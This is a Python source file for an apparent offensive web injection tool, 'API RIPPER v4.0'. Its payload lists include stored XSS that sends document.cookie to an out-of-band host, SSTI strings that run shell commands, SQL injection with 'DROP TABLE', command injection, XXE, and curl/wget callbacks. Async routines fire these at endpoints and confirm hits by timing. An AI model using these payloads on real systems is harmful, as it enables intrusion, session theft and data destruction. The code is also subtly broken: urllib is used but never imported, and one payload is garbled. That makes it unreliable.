"""
API RIPPER v4.0 — Deep Injection Engine
Second-order injection, blind OOB, polyglot payloads, and chained exploitation.

Capabilities:
  1. Second-Order Injection — Store-then-trigger attack patterns
  2. Blind OOB Detection — DNS/HTTP callback simulation for blind vulns
  3. Polyglot Payloads — Cross-context payloads (SQLi+XSS+SSTI in one)
  4. Chained Injection — Multi-step exploitation sequences
  5. Context-Aware Encoding — Auto-detect injection context and adapt
  6. Time-Based Oracle — Precise timing analysis for blind injection
"""

import asyncio
import hashlib
import json
import logging
import random
import re
import statistics
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from uuid import uuid4

logger = logging.getLogger(__name__)


# ── Polyglot Payloads ───────────────────────────────────────

POLYGLOT_PAYLOADS = {
    "universal": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerikOa%01telerikXSS/telerik/<svg/onload=alert()>",
        "'-var x=1;alert(x)-'",
        "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}",
        "' AND 1=1--/**/{{7*7}}",
        "\"><img src=x onerror=alert(1)>{{7*7}}' OR '1'='1",
    ],
    "sqli_xss": [
        "1'\" -->]]>*/</script><svg onload=alert(1)> OR 1=1--",
        "'-alert(1)-'OR 1=1--",
        "<img src=x onerror=alert(1)>' UNION SELECT NULL--",
    ],
    "ssti_sqli": [
        "{{7*7}}' AND 1=1--",
        "${7*7}' OR SLEEP(3)--",
        "#{7*7}'; WAITFOR DELAY '0:0:3'--",
    ],
    "nosqli_ssti": [
        '{"$gt":"","__proto__":{"admin":true}}',
        '{"$where":"this.a==\\"{{7*7}}\\""}',
        '{"$regex":".*","role":"admin"}',
    ],
}

# ── Second-Order Injection Patterns ─────────────────────────

SECOND_ORDER_PATTERNS = {
    "stored_xss": {
        "store_payloads": [
            "<script>fetch('//{{OOB}}/xss?c='+document.cookie)</script>",
            "<img src=x onerror=fetch('//{{OOB}}/xss')>",
            "javascript:alert(document.domain)//",
        ],
        "trigger_actions": ["view_profile", "admin_panel", "export_report", "email_notification"],
        "store_fields": ["name", "bio", "description", "comment", "title", "message", "username"],
    },
    "stored_sqli": {
        "store_payloads": [
            "admin'--", "admin' OR '1'='1'--", "'; DROP TABLE users;--",
            "admin'; WAITFOR DELAY '0:0:5'--",
        ],
        "trigger_actions": ["search", "export", "report", "filter", "sort"],
        "store_fields": ["username", "email", "name", "address", "company"],
    },
    "stored_ssti": {
        "store_payloads": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "trigger_actions": ["render_template", "preview", "pdf_export", "email_send"],
        "store_fields": ["template", "content", "body", "message", "bio"],
    },
}

# ── Time-Based Oracle Payloads ──────────────────────────────

TIME_ORACLE_PAYLOADS = {
    "mysql": [
        ("' AND SLEEP({delay})--", "sqli"),
        ("' AND BENCHMARK({delay}000000,SHA1('test'))--", "sqli"),
        ("' OR IF(1=1,SLEEP({delay}),0)--", "sqli"),
    ],
    "postgres": [
        ("'; SELECT pg_sleep({delay})--", "sqli"),
        ("' AND (SELECT pg_sleep({delay}))::text=''--", "sqli"),
    ],
    "mssql": [
        ("'; WAITFOR DELAY '0:0:{delay}'--", "sqli"),
        ("' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay}))a)--", "sqli"),
    ],
    "generic_sql": [
        ("' AND SLEEP({delay})--", "sqli"),
        ("' OR SLEEP({delay})--", "sqli"),
        ("1; WAITFOR DELAY '0:0:{delay}'--", "sqli"),
    ],
    "nosql": [
        ('{{"$where":"sleep({delay}000)"}}', "nosqli"),
        ('{{"$where":"function(){{sleep({delay}000);return true;}}"}}', "nosqli"),
    ],
    "ssti": [
        ("{{% set x = cycler.__init__.__globals__.os.popen('sleep {delay}').read() %}}", "ssti"),
        ("${{T(java.lang.Thread).sleep({delay}000)}}", "ssti"),
    ],
    "cmd": [
        ("; sleep {delay}", "rce"),
        ("| sleep {delay}", "rce"),
        ("$(sleep {delay})", "rce"),
        ("`sleep {delay}`", "rce"),
        ("& ping -n {delay} 127.0.0.1 &", "rce"),
    ],
}


# ── Injection Context Detector ──────────────────────────────

class InjectionContextDetector:
    """Detect the injection context from response behavior."""

    HTML_CONTEXT_PATTERNS = [
        (r'<[^>]*VALUE_MARKER', "html_attribute"),
        (r'>VALUE_MARKER<', "html_text"),
        (r'<script[^>]*>.*VALUE_MARKER', "javascript"),
        (r'<!--.*VALUE_MARKER', "html_comment"),
        (r'<style[^>]*>.*VALUE_MARKER', "css"),
    ]

    SQL_ERROR_PATTERNS = {
        "mysql": [r"you have an error in your sql", r"mysql_fetch", r"warning.*mysql"],
        "postgres": [r"pg_query", r"psql.*error", r"invalid input syntax"],
        "mssql": [r"unclosed quotation mark", r"microsoft.*odbc", r"sql server"],
        "oracle": [r"ora-\d{5}", r"oracle.*error"],
        "sqlite": [r"sqlite3.*operationalerror", r"near.*syntax error"],
    }

    @classmethod
    def detect_reflection_context(cls, response_body: str, canary: str) -> str:
        if canary not in response_body:
            return "no_reflection"
        for pattern, context in cls.HTML_CONTEXT_PATTERNS:
            if re.search(pattern.replace("VALUE_MARKER", re.escape(canary)), response_body, re.I | re.S):
                return context
        return "unknown_reflected"

    @classmethod
    def detect_sql_backend(cls, error_body: str) -> str:
        lower = error_body.lower()
        for db, patterns in cls.SQL_ERROR_PATTERNS.items():
            for p in patterns:
                if re.search(p, lower):
                    return db
        return "unknown"


# ── Blind OOB Tracker ───────────────────────────────────────

@dataclass
class OOBCanary:
    """Tracks an out-of-band interaction canary."""
    id: str = field(default_factory=lambda: uuid4().hex[:12])
    payload_type: str = ""
    endpoint: str = ""
    param: str = ""
    injected_at: float = field(default_factory=time.time)
    callback_url: str = ""
    triggered: bool = False

    @property
    def age_seconds(self) -> float:
        return time.time() - self.injected_at


class OOBTracker:
    """Manages OOB canary tokens for blind vulnerability detection."""

    def __init__(self, callback_domain: str = "oob.internal.tracker"):
        self.domain = callback_domain
        self._canaries: Dict[str, OOBCanary] = {}

    def create_canary(self, payload_type: str, endpoint: str, param: str) -> OOBCanary:
        canary = OOBCanary(payload_type=payload_type, endpoint=endpoint, param=param)
        canary.callback_url = f"http://{canary.id}.{self.domain}"
        self._canaries[canary.id] = canary
        return canary

    def generate_oob_payloads(self, canary: OOBCanary) -> List[Dict[str, str]]:
        """Generate OOB interaction payloads for various injection types."""
        cb = canary.callback_url
        cid = canary.id
        return [
            {"type": "xxe", "payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{cb}">]><foo>&xxe;</foo>'},
            {"type": "ssrf", "payload": cb},
            {"type": "ssrf_dns", "payload": f"http://{cid}.{self.domain}/ssrf"},
            {"type": "rce_curl", "payload": f"$(curl {cb}/rce)"},
            {"type": "rce_wget", "payload": f"`wget {cb}/rce`"},
            {"type": "ssti_python", "payload": f"{{{{{{''.format.__class__.__mro__[1].__subclasses__()}}}}}}"},
            {"type": "blind_sqli_dns", "payload": f"' AND LOAD_FILE(CONCAT('\\\\\\\\',({cid}),'.{self.domain}\\\\a'))--"},
        ]

    def mark_triggered(self, canary_id: str):
        if canary_id in self._canaries:
            self._canaries[canary_id].triggered = True

    def get_active_canaries(self) -> List[OOBCanary]:
        return [c for c in self._canaries.values() if not c.triggered and c.age_seconds < 300]

    def get_triggered(self) -> List[OOBCanary]:
        return [c for c in self._canaries.values() if c.triggered]

    def stats(self) -> Dict:
        return {
            "total_canaries": len(self._canaries),
            "active": len(self.get_active_canaries()),
            "triggered": len(self.get_triggered()),
        }


# ── Time Oracle Analyzer ───────────────────────────────────

class TimeOracleAnalyzer:
    """Precise timing analysis for blind time-based injection."""

    def __init__(self, baseline_samples: int = 5, delay_seconds: int = 5):
        self.baseline_samples = baseline_samples
        self.delay_seconds = delay_seconds
        self._baselines: Dict[str, List[float]] = {}

    async def collect_baseline(self, request_func, url: str, method: str = "GET",
                                n: int = 5) -> Dict[str, float]:
        latencies = []
        for i in range(n):
            if i > 0:
                await asyncio.sleep(0.3)
            start = time.time()
            resp = await request_func(url, method)
            elapsed = (time.time() - start) * 1000
            if resp:
                latencies.append(elapsed)

        if not latencies:
            return {"status": "failed"}

        self._baselines[url] = latencies
        return {
            "mean_ms": statistics.mean(latencies),
            "stddev_ms": statistics.stdev(latencies) if len(latencies) > 1 else 0,
            "max_ms": max(latencies),
            "min_ms": min(latencies),
            "samples": len(latencies),
        }

    def is_time_anomaly(self, url: str, test_latency_ms: float, expected_delay_ms: float = 5000) -> Tuple[bool, Dict]:
        baseline = self._baselines.get(url, [])
        if not baseline:
            return test_latency_ms > expected_delay_ms * 0.8, {"reason": "no_baseline"}

        mean = statistics.mean(baseline)
        stddev = statistics.stdev(baseline) if len(baseline) > 1 else mean * 0.1

        # Must exceed baseline + expected delay - tolerance
        threshold = mean + (expected_delay_ms * 0.7)
        z_score = (test_latency_ms - mean) / max(stddev, 1) if stddev > 0 else 0

        is_anomaly = test_latency_ms > threshold and z_score > 3.0

        return is_anomaly, {
            "baseline_mean_ms": round(mean, 2),
            "baseline_stddev_ms": round(stddev, 2),
            "test_latency_ms": round(test_latency_ms, 2),
            "threshold_ms": round(threshold, 2),
            "z_score": round(z_score, 2),
            "is_anomaly": is_anomaly,
        }


# ── Deep Injection Engine ──────────────────────────────────

@dataclass
class InjectionFinding:
    """A confirmed injection finding with full evidence chain."""
    vuln_type: str = ""
    technique: str = ""
    endpoint: str = ""
    param: str = ""
    location: str = ""
    payload: str = ""
    severity: str = "high"
    confidence: float = 0.0
    evidence: List[Dict] = field(default_factory=list)
    is_second_order: bool = False
    is_blind: bool = False
    db_backend: str = ""
    curl_command: str = ""

    def to_dict(self) -> Dict:
        return {
            "vuln_type": self.vuln_type,
            "technique": self.technique,
            "endpoint": self.endpoint,
            "param": self.param,
            "location": self.location,
            "payload": self.payload,
            "severity": self.severity,
            "confidence": self.confidence,
            "evidence_count": len(self.evidence),
            "is_second_order": self.is_second_order,
            "is_blind": self.is_blind,
            "db_backend": self.db_backend,
        }


class DeepInjectionEngine:
    """
    Elite deep injection engine for advanced vulnerability discovery.

    Phases:
      1. Context Detection — Canary injection to detect reflection context
      2. Polyglot Sweep — Cross-context payloads for broad detection
      3. Time Oracle — Precise blind injection with statistical validation
      4. Second-Order — Store-then-trigger attack patterns
      5. OOB Detection — Blind callback-based confirmation
      6. Chained Exploitation — Multi-step injection sequences
    """

    def __init__(self, knowledge_graph=None, waf_evasion=None):
        self.kg = knowledge_graph
        self.waf_evasion = waf_evasion
        self.oob_tracker = OOBTracker()
        self.time_oracle = TimeOracleAnalyzer()
        self._findings: List[InjectionFinding] = []
        self._context_cache: Dict[str, str] = {}
        self._tested_combos: set = set()
        self._stats = {"polyglot_hits": 0, "time_hits": 0, "second_order_hits": 0,
                        "oob_hits": 0, "total_tests": 0}

    # ── Phase 1: Context Detection ──────────────────────────

    async def detect_context(self, request_func, endpoint: str, param: str,
                              location: str = "query", method: str = "GET") -> str:
        """Inject canary to detect reflection context."""
        cache_key = f"{endpoint}:{param}:{location}"
        if cache_key in self._context_cache:
            return self._context_cache[cache_key]

        canary = f"RIPPER{random.randint(10000,99999)}"
        url = self._build_url(endpoint, param, canary, location)
        resp = await request_func(url, method)

        if resp and resp.get("body"):
            body = resp.get("body", resp.get("body_preview", ""))
            context = InjectionContextDetector.detect_reflection_context(body, canary)
        else:
            context = "no_reflection"

        self._context_cache[cache_key] = context
        return context

    # ── Phase 2: Polyglot Sweep ─────────────────────────────

    async def polyglot_sweep(self, request_func, endpoint: str, param: str,
                              location: str = "query", method: str = "GET") -> List[InjectionFinding]:
        """Send polyglot payloads that test multiple injection types at once."""
        findings = []
        context = await self.detect_context(request_func, endpoint, param, location, method)

        # Select polyglot set based on context
        if context in ("html_attribute", "html_text", "javascript"):
            payloads = POLYGLOT_PAYLOADS["sqli_xss"] + POLYGLOT_PAYLOADS["universal"]
        elif context == "no_reflection":
            payloads = POLYGLOT_PAYLOADS["ssti_sqli"] + POLYGLOT_PAYLOADS["nosqli_ssti"]
        else:
            payloads = POLYGLOT_PAYLOADS["universal"]

        for payload in payloads[:6]:
            self._stats["total_tests"] += 1
            combo = f"{endpoint}:{param}:{hashlib.md5(payload.encode()).hexdigest()[:8]}"
            if combo in self._tested_combos:
                continue
            self._tested_combos.add(combo)

            url = self._build_url(endpoint, param, payload, location)
            resp = await request_func(url, method)
            if not resp:
                continue

            body = resp.get("body", resp.get("body_preview", ""))
            status = resp.get("status", 0)
            evidence = []

            # Check for SSTI math evaluation
            if "49" in body and "7*7" in payload:
                evidence.append({"signal": "ssti_math_eval", "found": "49", "weight": 2.0})

            # Check for SQL error disclosure
            db = InjectionContextDetector.detect_sql_backend(body)
            if db != "unknown":
                evidence.append({"signal": "sql_error_disclosure", "db": db, "weight": 1.5})

            # Check for XSS reflection
            if payload in body and "text/html" in str(resp.get("headers", {}).get("content-type", "")):
                evidence.append({"signal": "xss_reflection", "weight": 1.0})

            # Check for 500 error (payload reached backend)
            if status == 500:
                evidence.append({"signal": "server_error", "status": 500, "weight": 0.5})

            if evidence:
                self._stats["polyglot_hits"] += 1
                total_weight = sum(e["weight"] for e in evidence)
                conf = min(0.95, 0.4 + total_weight * 0.15)
                finding = InjectionFinding(
                    vuln_type=evidence[0]["signal"].split("_")[0],
                    technique="polyglot",
                    endpoint=endpoint, param=param, location=location,
                    payload=payload, confidence=conf, evidence=evidence,
                    db_backend=db if db != "unknown" else "",
                    severity="critical" if total_weight >= 2.0 else "high",
                )
                findings.append(finding)

        return findings

    # ── Phase 3: Time Oracle ────────────────────────────────

    async def time_based_injection(self, request_func, endpoint: str, param: str,
                                    location: str = "query", method: str = "GET",
                                    db_hint: str = "") -> List[InjectionFinding]:
        """Statistical time-based blind injection with Oracle analysis."""
        findings = []

        # Collect baseline
        baseline = await self.time_oracle.collect_baseline(request_func, endpoint, method)
        if baseline.get("status") == "failed":
            return findings

        # Select payloads based on DB hint
        delay = 5
        payload_sets = []
        if db_hint:
            payload_sets.append((db_hint, TIME_ORACLE_PAYLOADS.get(db_hint, [])))
        payload_sets.append(("generic_sql", TIME_ORACLE_PAYLOADS.get("generic_sql", [])))
        payload_sets.append(("cmd", TIME_ORACLE_PAYLOADS.get("cmd", [])))

        for db_type, payloads in payload_sets:
            for template, vuln_type in payloads[:3]:
                self._stats["total_tests"] += 1
                payload = template.replace("{delay}", str(delay))

                url = self._build_url(endpoint, param, payload, location)
                start = time.time()
                resp = await request_func(url, method)
                elapsed_ms = (time.time() - start) * 1000

                if not resp:
                    continue

                is_anomaly, analysis = self.time_oracle.is_time_anomaly(
                    endpoint, elapsed_ms, delay * 1000
                )

                if is_anomaly:
                    # Confirmation: re-test with different delay
                    confirm_delay = 3
                    confirm_payload = template.replace("{delay}", str(confirm_delay))
                    confirm_url = self._build_url(endpoint, param, confirm_payload, location)
                    await asyncio.sleep(0.5)

                    start2 = time.time()
                    resp2 = await request_func(confirm_url, method)
                    elapsed2_ms = (time.time() - start2) * 1000

                    is_confirmed, analysis2 = self.time_oracle.is_time_anomaly(
                        endpoint, elapsed2_ms, confirm_delay * 1000
                    )

                    if is_confirmed:
                        self._stats["time_hits"] += 1
                        findings.append(InjectionFinding(
                            vuln_type=vuln_type, technique="time_oracle",
                            endpoint=endpoint, param=param, location=location,
                            payload=payload, severity="critical", confidence=0.9,
                            is_blind=True, db_backend=db_type,
                            evidence=[
                                {"signal": "time_delay_confirmed", "delay_1": analysis, "delay_2": analysis2},
                                {"signal": "double_confirmation", "d1_ms": elapsed_ms, "d2_ms": elapsed2_ms},
                            ],
                        ))
                        return findings  # Confirmed, stop

        return findings

    # ── Phase 4: Second-Order Injection ─────────────────────

    async def second_order_injection(self, request_func, store_endpoint: str,
                                      trigger_endpoint: str, method: str = "POST") -> List[InjectionFinding]:
        """Store payload in one endpoint, trigger in another."""
        findings = []

        for pattern_name, pattern in SECOND_ORDER_PATTERNS.items():
            for store_field in pattern["store_fields"][:3]:
                for payload in pattern["store_payloads"][:2]:
                    self._stats["total_tests"] += 1

                    # Substitute OOB domain
                    final_payload = payload.replace("{{OOB}}", self.oob_tracker.domain)

                    # Store
                    store_body = json.dumps({store_field: final_payload})
                    store_resp = await request_func(
                        store_endpoint, method,
                        body=store_body, content_type="application/json"
                    )
                    if not store_resp or store_resp.get("status", 0) not in (200, 201, 204):
                        continue

                    await asyncio.sleep(0.5)

                    # Trigger
                    trigger_resp = await request_func(trigger_endpoint, "GET")
                    if not trigger_resp:
                        continue

                    body = trigger_resp.get("body", trigger_resp.get("body_preview", ""))
                    status = trigger_resp.get("status", 0)

                    evidence = []
                    if status == 500:
                        evidence.append({"signal": "trigger_error", "status": 500})
                    if final_payload in body or "49" in body:
                        evidence.append({"signal": "stored_payload_rendered"})
                    if any(kw in body.lower() for kw in ["syntax error", "traceback", "exception"]):
                        evidence.append({"signal": "error_disclosure"})

                    if evidence:
                        self._stats["second_order_hits"] += 1
                        findings.append(InjectionFinding(
                            vuln_type=pattern_name, technique="second_order",
                            endpoint=store_endpoint, param=store_field, location="body",
                            payload=final_payload, severity="critical", confidence=0.85,
                            is_second_order=True,
                            evidence=evidence + [{"store_endpoint": store_endpoint,
                                                   "trigger_endpoint": trigger_endpoint}],
                        ))

        return findings

    # ── Phase 5: OOB Injection ──────────────────────────────

    async def oob_injection(self, request_func, endpoint: str, param: str,
                             location: str = "query", method: str = "GET") -> List[OOBCanary]:
        """Inject OOB canaries for blind vulnerability detection."""
        canary = self.oob_tracker.create_canary("blind_injection", endpoint, param)
        oob_payloads = self.oob_tracker.generate_oob_payloads(canary)

        for oob in oob_payloads[:4]:
            self._stats["total_tests"] += 1
            url = self._build_url(endpoint, param, oob["payload"], location)
            await request_func(url, method)
            await asyncio.sleep(0.2)

        return [canary]

    # ── Full Scan ───────────────────────────────────────────

    async def deep_scan(self, request_func, endpoint: str, params: List[Dict],
                         db_hint: str = "") -> List[InjectionFinding]:
        """Run the complete deep injection pipeline against an endpoint."""
        all_findings = []

        for param_info in params[:5]:
            param = param_info.get("param", "id")
            location = param_info.get("location", "query")
            method = param_info.get("method", "GET")

            # Phase 1+2: Polyglot sweep (includes context detection)
            polyglot_results = await self.polyglot_sweep(
                request_func, endpoint, param, location, method
            )
            all_findings.extend(polyglot_results)

            # Phase 3: Time oracle (if no polyglot hits for this param)
            if not polyglot_results:
                time_results = await self.time_based_injection(
                    request_func, endpoint, param, location, method, db_hint
                )
                all_findings.extend(time_results)

            # Phase 5: OOB canaries (always inject for async detection)
            await self.oob_injection(request_func, endpoint, param, location, method)

        self._findings.extend(all_findings)
        return all_findings

    # ── Helpers ──────────────────────────────────────────────

    @staticmethod
    def _build_url(endpoint: str, param: str, payload: str, location: str) -> str:
        if location == "query":
            sep = "&" if "?" in endpoint else "?"
            return f"{endpoint}{sep}{param}={urllib.parse.quote(payload, safe='')}"
        elif location == "path":
            return re.sub(r'/(\d+)(?=[/?#]|$)', f'/{payload}', endpoint, count=1)
        return endpoint

    def stats(self) -> Dict[str, Any]:
        return {
            **self._stats,
            "findings_count": len(self._findings),
            "oob": self.oob_tracker.stats(),
            "contexts_cached": len(self._context_cache),
        }

    def to_dict(self) -> Dict[str, Any]:
        return self.stats()
